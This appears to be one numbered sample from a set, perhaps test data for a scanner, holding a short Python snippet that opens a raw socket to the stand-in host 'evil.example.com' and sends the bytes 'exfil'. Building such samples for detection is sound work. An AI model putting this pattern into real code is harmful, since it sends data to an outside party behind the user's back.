# Sample 27: raw socket connection.
import socket
s = socket.create_connection(("evil.example.com", 443))
s.sendall(b"exfil")
